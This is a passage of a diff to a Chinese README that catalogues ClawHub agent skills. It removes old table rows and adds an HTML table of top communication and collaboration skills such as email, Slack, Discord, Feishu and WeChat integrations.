-| NGBS iCON 恒温器 | [Clawdbot/enzoldhazam](https://clawdhub.com/skills/enzoldhazam) | 控制 NGBS iCON 智能家居恒温器。当用户询问家庭温度、供暖、恒温器控制或想要调节室温时使用。 |
-| FFmpeg CLI | [Clawdbot/ffmpeg-cli](https://clawdhub.com/skills/ffmpeg-cli) | （无） |
-| 奥地利公司注册查询 | [Clawdbot/firmenbuchat](https://clawdhub.com/skills/firmenbuchat) | CLI für den Zugriff auf das österreichische Firmenbuch (HVD WebServices)。 |
-| 表单生成器 | [Clawdbot/form-gen](https://clawdhub.com/skills/form-gen) | 生成带有验证的表单组件。构建表单时使用。 |
-| macOS 焦点模式 | [Clawdbot/get-focus-mode](https://clawdhub.com/skills/get-focus-mode) | 获取当前 macOS 焦点模式 |
-| Google Workspace CLI | [Clawdbot/gogcli](https://clawdhub.com/skills/gogcli) | （无） |
-| Google Home/Nest | [Clawdbot/google-home](https://clawdhub.com/skills/google-home) | （无） |
-| Govee 灯光控制 | [Clawdbot/govee-lights](https://clawdhub.com/skills/govee-lights) | （无） |
-| Hevy 健身追踪 | [Clawdbot/hevycli](https://clawdhub.com/skills/hevycli) | （无） |
-| HVAC 估算 | [Clawdbot/hvac-estimate-takeoff](https://clawdhub.com/skills/hvac-estimate-takeoff) | （无） |
-| Hytale 服务器 | [Clawdbot/hytale](https://clawdhub.com/skills/hytale) | （无） |
-| Karakeep 保存 | [Clawdbot/karakeep-save](https://clawdhub.com/skills/karakeep-save) | 将书签保存到 Karakeep（自托管书签管理器）。当用户想要保存 URL、为链接添加书签或向其阅读列表添加内容时使用。 |
-| 延迟加载建议器 | [Clawdbot/lazy-load-gen](https://clawdhub.com/skills/lazy-load-gen) | 识别应该延迟加载的组件。优化包大小时使用。 |
-| 延迟加载建议器 | [Clawdbot/lazy-load-suggester](https://clawdhub.com/skills/lazy-load-suggester) | 识别应该延迟加载的组件。优化包大小时使用。 |
-| leadklick | [Clawdbot/leadklick](https://clawdhub.com/skills/leadklick) | （无） |
-| 营销技能 | [Clawdbot/marketing-skills](https://clawdhub.com/skills/marketing-skills) | （无） |
-| Microsoft 365 MCP | [Clawdbot/mcp-microsoft365](https://clawdhub.com/skills/mcp-microsoft365) | （无） |
-| MCP 技能 | [Clawdbot/mcp-skill](https://clawdhub.com/skills/mcp-skill) | （无） |
-| Monorepo 生成器 | [Clawdbot/monorepo-gen](https://clawdhub.com/skills/monorepo-gen) | 设置 Turborepo monorepo 结构。启动 monorepo 时使用。 |
-| Morning Routine | [Clawdbot/morning-routine](https://clawdhub.com/skills/morning-routine) | 通过习惯检查表、时间安排和连续追踪来建立强大的早晨例行公事 |
-| Nanoleaf 灯光控制 | [Clawdbot/nanoleaf](https://clawdhub.com/skills/nanoleaf) | 通过 Picoleaf CLI 控制 Nanoleaf 灯板。用于打开/关闭 Nanoleaf、调整亮度、设置颜色 (RGB/HSL)、更改色温或任何 Nanoleaf 照明控制。 |
-| Nmap 侦察 | [Clawdbot/nmap-recon](https://clawdhub.com/skills/nmap-recon) | （无） |
-| OpenHue 灯光控制 | [Clawdbot/openhue](https://clawdhub.com/skills/openhue) | 通过 OpenHue CLI 控制 Philips Hue 灯光/场景。 |
-| Ordercli 订单查询 | [Clawdbot/ordercli](https://clawdhub.com/skills/ordercli) | 仅 Foodora CLI 用于检查过去的订单和活动订单状态 (Deliveroo WIP)。 |
-| Overseerr 媒体请求 | [Clawdbot/overseerr-request-media](https://clawdhub.com/skills/overseerr-request-media) | （无） |
-| PCO CLI | [Clawdbot/pco](https://clawdhub.com/skills/pco) | （无） |
-| Peekaboo macOS UI | [Clawdbot/peekaboo](https://clawdhub.com/skills/peekaboo) | 使用 Peekaboo CLI 捕获并自动化 macOS UI。 |
-| Pepsi Or Coke MCP | [Clawdbot/pepsi-or-coke-mcp](https://clawdhub.com/skills/pepsi-or-coke-mcp) | 百事可乐 百事可乐 可口可乐 |
-| Pi-hole 控制 | [Clawdbot/pihole](https://clawdhub.com/skills/pihole) | （无） |
-| Plan2Meal | [Clawdbot/plan2meal](https://clawdhub.com/skills/plan2meal) | （无） |
-| qBittorrent 管理 | [Clawdbot/qbittorrent](https://clawdhub.com/skills/qbittorrent) | 使用 qBittorrent 管理种子。当用户要求“列出 torrent”、“添加 torrent”、“暂停 torrent”、“恢复 torrent”、“删除 torrent”、“检查下载状态”、“Torrent 速度”、“qBittorrent 统计信息”或提及 qBittorrent/qbit torrent 管理时使用。 |
-| 戒酒追踪 | [Clawdbot/quit-alcohol](https://clawdhub.com/skills/quit-alcohol) | 通过连续戒酒、烟瘾管理和恢复里程碑来跟踪清醒情况 |
-| 戒咖啡因追踪 | [Clawdbot/quit-caffeine](https://clawdhub.com/skills/quit-caffeine) | 通过戒断跟踪、逐渐减少计划和能量里程碑来减少或戒掉咖啡因 |
-| 戒超支追踪 | [Clawdbot/quit-overspending](https://clawdhub.com/skills/quit-overspending) | 通过连续消费、冲动跟踪和储蓄里程碑来打破冲动购买习惯 |
-| 戒色情追踪 | [Clawdbot/quit-porn](https://clawdhub.com/skills/quit-porn) | 通过连续追踪、冲动管理和恢复里程碑来摆脱色情成瘾 |
-| Readeck 保存 | [Clawdbot/readeck-save](https://clawdhub.com/skills/readeck-save) | 将文章保存到 Readeck（自托管的稍后阅读应用程序）。当用户想要保存文章以供以后阅读、向阅读列表添加内容或向 Readeck 发送页面时使用。 |
-| Readwise & Reader | [Clawdbot/readwise](https://clawdhub.com/skills/readwise) | 访问 Readwise 亮点和 Reader 保存的文章 |
-| SABnzbd 管理 | [Clawdbot/sabnzbd](https://clawdhub.com/skills/sabnzbd) | 使用 SABnzbd 管理 Usenet 下载。当用户要求“检查 SABnzbd”、“列出 NZB 队列”、“添加 NZB”、“暂停下载”、“恢复下载”、“SABnzbd 状态”、“Usenet 队列”、“NZB 历史记录”或提及 SABnzbd/sab 下载管理时使用。 |
-| Samsung SmartThings | [Clawdbot/samsung-smartthings](https://clawdhub.com/skills/samsung-smartthings) | 通过 SmartThings（OAuth 应用程序 + 设备控制）控制三星电视。 |
-| 首尔地铁查询 | [Clawdbot/seoul-metro](https://clawdhub.com/skills/seoul-metro) | 首尔地铁助理，提供实时到达、路线规划和服务提醒（韩语/英语） |
-| 首尔地铁查询 | [Clawdbot/seoul-subway](https://clawdhub.com/skills/seoul-subway) | 首尔地铁助手，提供实时到达、路线规划和服务提醒（韩语/英语） |
-| URL 缩短器 | [Clawdbot/shorten](https://clawdhub.com/skills/shorten) | 使用 is.gd 缩短 URL（无需身份验证）。返回一个永久的短链接。 |
-| Slack 集成 | [Clawdbot/slack](https://clawdhub.com/skills/slack) | 当您需要通过 slack 工具从 Clawdbot 控制 Slack 时使用，包括对 Slack 通道或 DM 中的消息做出反应或固定/取消固定项目。 |
-| Snapshot Test Writer | [Clawdbot/snapshot-writer](https://clawdhub.com/skills/snapshot-writer) | 为 React 组件生成 Jest 快照测试。当您需要 UI 组件的快照覆盖时使用。 |
-| Socket 生成器 | [Clawdbot/socket-gen](https://clawdhub.com/skills/socket-gen) | 使用 Socket.io 生成 WebSocket 处理程序。在构建实时功能时使用。 |
-| Sonos CLI | [Clawdbot/sonoscli](https://clawdhub.com/skills/sonoscli) | 控制 Sonos 扬声器（发现/状态/播放/音量/组）。 |
-| Stranger-Danger | [Clawdbot/stranger-danger](https://clawdhub.com/skills/stranger-danger) | （无） |
-| Tessie Tesla Control | [Clawdbot/tessie](https://clawdhub.com/skills/tessie) | （无） |
-| Test Google Chat | [Clawdbot/test-google-chat](https://clawdhub.com/skills/test-google-chat) | 测试 Google Chat 消息传递的技能 |
-| Test Minimal | [Clawdbot/test-minimal-skill](https://clawdhub.com/skills/test-minimal-skill) | 最低限度的测试技能 |
-| Test Runner | [Clawdbot/test-runner](https://clawdhub.com/skills/test-runner) | （无） |
-| testskill | [Clawdbot/testskill](https://clawdhub.com/skills/testskill) | （无） |
-| tldr | [Clawdbot/tldr](https://clawdhub.com/skills/tldr) | 来自 tldr-pages 的简化手册页。使用它可以快速了解 CLI 工具。 |
-| tldr | [Clawdbot/tldr-bak-2026-01-28t18-01-30-10-30](https://clawdhub.com/skills/tldr-bak-2026-01-28t18-01-30-10-30) | 来自 tldr-pages 的简化手册页。使用它可以快速了解 CLI 工具。 |
-| todoist latest | [Clawdbot/todoist-rs](https://clawdhub.com/skills/todoist-rs) | 管理Todoist任务。当用户提到“todoist”、“我的任务”、“任务列表”、“添加任务”、“完成任务”或想要与其Todoist帐户交互时使用。 |
-| Token Alert | [Clawdbot/token-alert](https://clawdhub.com/skills/token-alert) | （无） |
-| Umeå Data | [Clawdbot/umea-data](https://clawdhub.com/skills/umea-data) | （无） |
-| WebSocket Handler Generator | [Clawdbot/websocket-gen](https://clawdhub.com/skills/websocket-gen) | 使用 Socket.io 生成 WebSocket 处理程序。在构建实时功能时使用。 |
-| Weight Loss | [Clawdbot/weight-loss](https://clawdhub.com/skills/weight-loss) | 通过称重、趋势分析和目标里程碑来跟踪减肥历程 |
-| YBoard Operator | [Clawdbot/yboard-operator](https://clawdhub.com/skills/yboard-operator) | （无） |
-| YNAB | [Clawdbot/ynab](https://clawdhub.com/skills/ynab) | 通过 CLI 管理 YNAB 预算、账户、类别和交易。 |
+<a id="cat-communication-collaboration"></a>
 
+## 7、💬 通讯协作
 
-## 五、使用说明
+> 该分类共 **1,390** 个技能，以下按下载量倒序展示 Top 200。
+
+<table>
+<colgroup>
+<col width="4%">
+<col width="8%">
+<col width="14%">
+<col width="14%">
+<col width="60%">
+</colgroup>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>中文技能名称</th>
+<th>技能名称</th>
+<th>链接</th>
+<th>核心功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td>imapsmtp邮件</td>
+<td>imap-smtp-email 🔑</td>
+<td><a href="https://clawdhub.com/skills/imap-smtp-email">ClawHub/imap-smtp-email</a></td>
+<td>使用IMAP/SMTP读取和发送邮件；检查新/未读邮件、获取内容、搜索邮箱、标记已读/未读、发送带附件的邮件。支持...</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>Slack 集成</td>
+<td>Slack</td>
+<td><a href="https://clawdhub.com/skills/slack">ClawHub/slack</a></td>
+<td>当需要通过 slack 工具从 Clawdbot 控制 Slack 时使用，包括在频道或私信中回复消息或置顶/取消置顶项目。</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>Himalaya</td>
+<td>Himalaya</td>
+<td><a href="https://clawdhub.com/skills/himalaya">ClawHub/himalaya</a></td>
+<td>{&quot;answer&quot;:&quot;通过IMAP/SMTP管理邮件的CLI。可在终端使用 `himalaya` 收发、回复、转发、搜索及整理邮件。支持多账户与MML（MIME元语言）编写邮件。&quot;}</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>Discord</td>
+<td>Discord</td>
+<td><a href="https://clawdhub.com/skills/discord">ClawHub/discord</a></td>
+<td>当需要通过discord工具控制Discord时使用：发送消息、添加反应、发布或上传表情包、上传表情、创建投票、管理帖子/置顶/搜索、获取权限或成员/角色/频道信息，或在Discord私信或频道中处理管理操作。</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td>Gmail</td>
+<td>Gmail 🔑</td>
+<td><a href="https://clawdhub.com/skills/gmail">ClawHub/gmail</a></td>
+<td>Gmail API 集成，托管 OAuth，支持读取、发送和管理邮件、线程、标签及草稿，适用于需要与 Gmail 交互的场景。</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td>Outlook</td>
+<td>Outlook 🔑</td>
+<td><a href="https://clawdhub.com/skills/outlook-api">ClawHub/outlook-api</a></td>
+<td>通过托管OAuth实现Microsoft Outlook API集成，可通过Microsoft Graph读取、发送和管理邮件、文件夹、日历事件和联系人。使用此技能...</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td>谷歌meet</td>
+<td>Google Meet 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-meet">ClawHub/google-meet</a></td>
+<td>通过托管 OAuth 集成 Google Meet API，创建会议室、查询会议记录并管理参会人员，适用于用户...</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td>Mailchimp</td>
+<td>Mailchimp 🔑</td>
+<td><a href="https://clawdhub.com/skills/mailchimp">ClawHub/mailchimp</a></td>
+<td>Mailchimp 市场 API 集成，使用托管 OAuth。可访问受众、营销活动、模板、自动化、报告以及管理订阅者。使用此技能...</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td>moltbook-interact</td>
+<td>moltbook-interact 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltbook-interact">ClawHub/moltbook-interact</a></td>
+<td>在 Moltbook 社交网络上与 AI 代理互动，支持发帖、回复、浏览及分析互动数据，适用于用户在 Moltbook 查看动态、回复帖子或追踪活动。</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td>Reddit (read only - no auth)</td>
+<td>Reddit (read only - no auth)</td>
+<td><a href="https://clawdhub.com/skills/reddit-readonly">ClawHub/reddit-readonly</a></td>
+<td>以只读模式通过公共 JSON 接口浏览和搜索 Reddit。当用户要求浏览子版块、按主题搜索帖子、查看评论线程或整理待审阅和手动回复的链接列表时使用。</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td>zoho邮件</td>
+<td>Zoho Mail 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-mail">ClawHub/zoho-mail</a></td>
+<td>Zoho Mail API 集成，使用托管 OAuth，可发送、接收和管理邮件、文件夹与标签。当用户想要发送邮件、读取邮件时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td>Imsg</td>
+<td>Imsg</td>
+<td><a href="https://clawdhub.com/skills/imsg">ClawHub/imsg</a></td>
+<td>用于列出聊天、查看历史记录、监控及发送消息的 iMessage/SMS 命令行工具。</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td>飞书文档管理器</td>
+<td>📄 Feishu Doc Manager \| 飞书文档管理器</td>
+<td><a href="https://clawdhub.com/skills/feishu-doc-manager">ClawHub/feishu-doc-manager</a></td>
+<td>📄 Feishu Doc Manager | 飞书文档管理器  Seamlessly publish Markdown content to Feishu Docs with automatic formatting. Solves key pain points: Markdown table conversion, permission management, batch writing...</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td>调度器forDiscord</td>
+<td>scheduler for discord</td>
+<td><a href="https://clawdhub.com/skills/scheduler-for-discord">ClawHub/scheduler-for-discord</a></td>
+<td>创建并管理定时提醒和帖子，用户请求Molbot稍后或按周期发送消息（尤其是当前Discord频道）时使用，无需提供频道ID。</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td>飞书消息</td>
+<td>Feishu Messaging 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-messaging">ClawHub/feishu-messaging</a></td>
+<td>飞书消息发送与文档创建工作流。 触发场景：查找群成员、查找群ID、发送消息失败需要重新尝试。 适用于：发送飞书消息。</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td>Reddit</td>
+<td>Reddit 🔑</td>
+<td><a href="https://clawdhub.com/skills/reddit">ClawHub/reddit</a></td>
+<td>{&quot;answer&quot;:&quot;浏览、搜索、发帖及管理Reddit。只读无需认证，发帖与管理需配置OAuth。&quot;}</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td>My Life Feed</td>
+<td>My Life Feed 🔑</td>
+<td><a href="https://clawdhub.com/skills/myfeed">ClawHub/myfeed</a></td>
+<td>通过 MyFeed REST API 管理 MyFeed 资源和群组。</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td>任务status</td>
+<td>Task Status</td>
+<td><a href="https://clawdhub.com/skills/task-status">ClawHub/task-status</a></td>
+<td>为长时间运行的任务发送简短状态描述。适用于在多步操作中提供周期性更新、确认任务完成或通知失败。包含每5秒自动监控更新、状态消息模板及辅助函数以确保报告一致性。</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td>飞书bridge</td>
+<td>Feishu Bridge 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-bridge">ClawHub/feishu-bridge</a></td>
+<td>通过 WebSocket 长连接将飞书机器人接入 Clawdbot，无需公网服务器、域名或 ngrok。适用于配置飞书消息通道、排查连接问题及管理桥接服务（启停/日志）。内容涵盖飞书开放平台机器人创建、凭据配置、桥接启动、macOS launchd 自动重启设置及群聊行为调优。</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td>Outlook</td>
+<td>Outlook 🔑</td>
+<td><a href="https://clawdhub.com/skills/outlook">ClawHub/outlook</a></td>
+<td>通过 Microsoft Graph API 读取、搜索和管理 Outlook 邮件和日历，适用于询问邮件、收件箱、日历或日程安排的场景。</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td>Telegram机器人</td>
+<td>Telegram Bot 🔑</td>
+<td><a href="https://clawdhub.com/skills/telegram-api">ClawHub/telegram-api</a></td>
+<td>通过托管认证实现 Telegram Bot API 集成。发送消息、管理聊天、处理更新并与用户交互。使用...</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td>套件</td>
+<td>Kit 🔑</td>
+<td><a href="https://clawdhub.com/skills/kit">ClawHub/kit</a></td>
+<td>Kit（原 ConvertKit）API 集成，支持托管 OAuth。可管理邮件订阅者、表单、标签、序列、广播和自定义字段。使用此技能...</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td>Jira</td>
+<td>JIRA</td>
+<td><a href="https://clawdhub.com/skills/jira">ClawHub/jira</a></td>
+<td>当用户提及 Jira 问题（如 PROJ‑123）、询问票据、创建/查看/更新问题、检查冲刺状态或管理 Jira 时使用。</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td>微信公众号文章发布</td>
+<td>微信公众号文章发布</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-pro">ClawHub/wechat-article-pro</a></td>
+<td>微信公众号文章发布专业版。功能：1)联网搜索热点信息 2)AI生成微信公众号封面图 3)撰写3000-5000字深度文章 4)使用公众号AI配图功能自动生成并上传封面 5)参考刘润公众号风格写作 6)自动排版 7)不加话题标签</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td>send邮件</td>
+<td>send-email 🔑</td>
+<td><a href="https://clawdhub.com/skills/send-email">ClawHub/send-email</a></td>
+<td>使用 SMTP 发送邮件。在 ~/.openclaw/openclaw.json 文件的 skills.entries.send-email.env 中进行配置。</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td>porteden邮件</td>
+<td>PortEden - secured email (Gmail, Outlook, Exchange) Email access for OpenClaw 🔑</td>
+<td><a href="https://clawdhub.com/skills/porteden-email">ClawHub/porteden-email</a></td>
+<td>安全邮件管理 - Gmail、Outlook 和 Exchange。适用于用户需要阅读、搜索或分类邮件；发送、回复、转发、删除或其他操作。</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td>Bluesky</td>
+<td>Bluesky</td>
+<td><a href="https://clawdhub.com/skills/bluesky">ClawHub/bluesky</a></td>
+<td>完整的Bluesky命令行工具：支持发帖、回复、点赞、转发、关注、屏蔽、静音、搜索、话题串及图片。满足您在终端使用Bluesky的一切需求。</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td>飞书</td>
+<td>Feishu 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu">ClawHub/feishu</a></td>
+<td>飞书深度集成技能。不是简单的消息桥接，而是你的数字指挥中枢。专为中国企业高压协作环境设计，理解“分寸”与“效率”两套并行规则，把消息、审批、会议、文档、多维表格、日程与邮箱，压缩成有优先级、可执行的行动链。</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td>Constant Contact</td>
+<td>Constant Contact 🔑</td>
+<td><a href="https://clawdhub.com/skills/constant-contact">ClawHub/constant-contact</a></td>
+<td>通过托管 OAuth 与 Constant Contact API 集成，支持读取、创建、更新、删除以及批量修改联系人及电子邮件。</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td>微信公众号工具包</td>
+<td>微信公众号工具包 🔑</td>
+<td><a href="https://clawdhub.com/skills/wechat-toolkit">ClawHub/wechat-toolkit</a></td>
+<td>微信公众号一站式工具—集成搜索、下载、AI改写、发布四大功能，适用于需搜索、下载、改写或发布公众号文章的场景。</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td>股票数据API</td>
+<td>股票数据API 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-stock-data-skill">ClawHub/openclaw-stock-data-skill</a></td>
+<td>使用 data.diemeng.chat 提供的接口查询股票日线、分钟线、财务指标等数据，支持 A 股等市场。</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td>Slack</td>
+<td>Slack 🔑</td>
+<td><a href="https://clawdhub.com/skills/slack-api">ClawHub/slack-api</a></td>
+<td>托管 OAuth 与 Slack API 集成，支持发送消息、管理频道、搜索对话及与 Slack 工作区交互。用户需要时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td>Fast.io</td>
+<td>Fast.io</td>
+<td><a href="https://clawdhub.com/skills/fast-io">ClawHub/fast-io</a></td>
+<td>代理团队工作空间。完整指南，涵盖全部19个整合工具，采用基于动作的路由——参数、工作流、ID格式与约束。</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td>Discord语音</td>
+<td>Discord Voice 🔑</td>
+<td><a href="https://clawdhub.com/skills/discord-voice">ClawHub/discord-voice</a></td>
+<td>在Discord语音频道中与Claude AI进行实时语音对话</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td>微信公众号文章导出</td>
+<td>微信公众号文章导出</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-reader">ClawHub/wechat-article-reader</a></td>
+<td>将微信公众号文章导出为 Markdown 格式。当用户提供微信公众号链接 (mp.weixin.qq.com) 或要求下载/导出/保存微信文章时触发。默认保存到工作空间的 source 目录。</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td>imap邮件</td>
+<td>IMAP Email Reader 🔑</td>
+<td><a href="https://clawdhub.com/skills/imap-email">ClawHub/imap-email</a></td>
+<td>使用 IMAP（ProtonMail Bridge、Gmail 等）读取管理邮件；检查新/未读、获取内容、搜索邮箱、标记已读/未读。支持所有 IMAP 服务器，包括 ProtonMail Bridge。</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td>Composio</td>
+<td>Composio 🔑</td>
+<td><a href="https://clawdhub.com/skills/composio">ClawHub/composio</a></td>
+<td>将AI智能体连接至500+应用，在Gmail、Slack、GitHub、Notion、Google Workspace等平台实现工具发现、连接管理与动作执行。</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td>中文AI科技日报</td>
+<td>AI News ZH - 中文AI科技日报</td>
+<td><a href="https://clawdhub.com/skills/ai-news-zh">ClawHub/ai-news-zh</a></td>
+<td>中文AI科技日报自动采集与推送。从The Verge、Wired、TechCrunch等英文源抓取最新AI资讯，自动翻译整理为中文，按分类推送到飞书/Telegram/Discord等渠道。适合关注AI行业动态的中文用户。</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td>Roadrunner</td>
+<td>Roadrunner 🔑</td>
+<td><a href="https://clawdhub.com/skills/roadrunner">ClawHub/roadrunner</a></td>
+<td>Beeper桌面CLI工具，用于聊天、消息、联系人、连接信息、WebSocket事件、搜索和提醒</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td>Discord聊天</td>
+<td>Discord Chat</td>
+<td><a href="https://clawdhub.com/skills/discord-chat">ClawHub/discord-chat</a></td>
+<td>使用消息工具在Discord频道中发送、回复及搜索消息。适用于用户需与Discord通讯（发送/回复/搜索消息）、查看动态或与频道互动时。</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td>clawdtalk客户端</td>
+<td>ClawdTalk 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawdtalk-client">ClawHub/clawdtalk-client</a></td>
+<td>ClawdTalk — Clawdbot的语音通话、短信及AI任务</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td>TelegramCompose</td>
+<td>Telegram Compose 🔑</td>
+<td><a href="https://clawdhub.com/skills/telegram-compose">ClawHub/telegram-compose</a></td>
+<td>通过Telegram直接API发送富文本HTML格式消息。由主会话自动调用，适用于实质性Telegram输出。规则：回复超过3行或包含结构化数据（列表、统计、段落、报告）时，派生Haiku子代理处理格式发送；短回复（&lt;3行）直接通过OpenClaw工具发送。适用场景：研究报告、警报、状态更新、报告、简报、通知等需要视觉层次的输出。</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td>企业微信</td>
+<td>企业微信 AI Bot 对接 🔑</td>
+<td><a href="https://clawdhub.com/skills/jvs-enterprise-wechat">ClawHub/jvs-enterprise-wechat</a></td>
+<td>快速配置 OpenClaw 与企业微信 AI Bot 对接，实现无需公网和证书的智能助理接入和消息回复功能。</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td>语音reply</td>
+<td>Voice Reply</td>
+<td><a href="https://clawdhub.com/skills/voice-reply">ClawHub/voice-reply</a></td>
+<td>使用 sherpa-onnx 的 Piper 语音实现本地文字转语音。100% 离线，无需 API 密钥。适用于用户请求语音回复、音频回复、口述答案或需要朗读的场景。支持多语言，包括德语 (thorsten) 和英语 (ryan) 语音。输出兼容 Telegram 的语音笔记，使用 [[audio_as_voice]] 标签。</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td>Chirp</td>
+<td>Chirp</td>
+<td><a href="https://clawdhub.com/skills/chirp">ClawHub/chirp</a></td>
+<td>使用 OpenClaw 浏览器工具的 X/Twitter CLI。适用于用户想要与 X/Twitter 互动：阅读时间线、发帖、点赞、转推、回复或搜索。在没有 Homebrew 的环境中替代 bird CLI。</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td>微信自动reply</td>
+<td>wechat-auto-reply</td>
+<td><a href="https://clawdhub.com/skills/wechat-auto-reply">ClawHub/wechat-auto-reply</a></td>
+<td>半自动回复微信联系人消息（置信度&gt;85%自动发送，否则确认），或主动发送指定内容。使用方式：wechat-auto-reply &quot;联系人名称&quot; 或 wechat-auto-reply &quot;联系人名称&quot; &quot;消息内容</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td>ClawSend</td>
+<td>ClawSend</td>
+<td><a href="https://clawdhub.com/skills/clawsend">ClawHub/clawsend</a></td>
+<td>使用加密签名实现代理间消息传递，通过ClawHub中继发送结构化消息。</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td>微信sender</td>
+<td>Wechat Sender</td>
+<td><a href="https://clawdhub.com/skills/wechat-sender">ClawHub/wechat-sender</a></td>
+<td>微信消息自动发送。使用 peekaboo 工具操作窗口，结合 Agent-Eye 获取实时屏幕截图进行视觉理解。触发条件：用户提到&quot;发微信&quot;、&quot;给xxx发消息&quot;、&quot;微信自动发送&quot;等。</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td>Clippy微软365CLI</td>
+<td>Clippy - Microsoft 365 CLI</td>
+<td><a href="https://clawdhub.com/skills/clippy">ClawHub/clippy</a></td>
+<td>{   &quot;answer&quot;: &quot;用于管理日历和邮件的 Microsoft 365 / Outlook CLI。适用于管理 Outlook 日历（查看、创建、更新、删除事件，查找会议时间，响应邀请）、发送/阅读邮件或搜索组织内的人员/会议室。&quot; }</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td>SendClaw Email - Bots &amp; Agents get their own email address</td>
+<td>SendClaw Email - Bots &amp; Agents get their own email address 🔑</td>
+<td><a href="https://clawdhub.com/skills/sendclaw">ClawHub/sendclaw</a></td>
+<td>获取免费邮箱地址 you@sendclaw.com - AI代理专用邮箱</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td>XAlgorithm</td>
+<td>X Algorithm</td>
+<td><a href="https://clawdhub.com/skills/x-algorithm">ClawHub/x-algorithm</a></td>
+<td>X (Twitter) AI 智能体算法规则与爆款策略。提升互动，规避流量封杀。适配 Cursor、Claude、ChatGPT、Copilot。支持 Vibe-coding。</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td>autonomous代理</td>
+<td>Autonomous Agent Skills 🔑</td>
+<td><a href="https://clawdhub.com/skills/autonomous-agent">ClawHub/autonomous-agent</a></td>
+<td>CornerStone MCP x402智能体技能。提供股票预测、回测、银行绑定及智能体/借款人评分工具。受支付保护的MCP工具（run_prediction、run_backtest、link_bank_account、get_agent_reputation_score、get_borrower_score及邮箱版本），采用x402流程（Aptos + Base）。技能处理402→支付→...</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td>Gws Gmail</td>
+<td>Gws Gmail</td>
+<td><a href="https://clawdhub.com/skills/gws-gmail">ClawHub/gws-gmail</a></td>
+<td>Gmail：发送、阅读和管理邮件。</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td>微信mppublisher</td>
+<td>wechat-mp-publisher 🔑</td>
+<td><a href="https://clawdhub.com/skills/wechat-mp-publisher">ClawHub/wechat-mp-publisher</a></td>
+<td>远程微信公众号发布技能。通过 HTTP MCP 解决家用宽带 IP 变动问题，支持大文件上传、多主题排版与一键发布。</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td>agency代理</td>
+<td>Agency Agents</td>
+<td><a href="https://clawdhub.com/skills/agency-agents">ClawHub/agency-agents</a></td>
+<td>AI Agent 团队 - 61 个专业 Agent，8 大部门，完整的 AI 代理机构。支持单 Agent 使用和多 Agent 协作编排。</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td>微信mpreader</td>
+<td>WeChat Article Reader</td>
+<td><a href="https://clawdhub.com/skills/wechat-mp-reader">ClawHub/wechat-mp-reader</a></td>
+<td>读取微信公众号文章。使用内置浏览器打开页面并提取正文文本。请务必在 URL 末尾添加 ?scene=1。</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td>evomap工具</td>
+<td>EvoMap Tools</td>
+<td><a href="https://clawdhub.com/skills/evomap-tools">ClawHub/evomap-tools</a></td>
